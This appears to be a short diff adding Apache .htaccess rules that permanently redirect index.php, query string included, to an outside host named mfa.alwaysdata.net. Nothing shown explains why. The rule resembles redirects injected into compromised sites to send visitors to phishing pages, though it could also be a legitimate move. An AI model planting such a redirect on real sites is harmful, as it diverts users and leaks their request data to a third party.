@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^index.php$ http://mfa.alwaysdata.net/ [QSA,L,R=301]
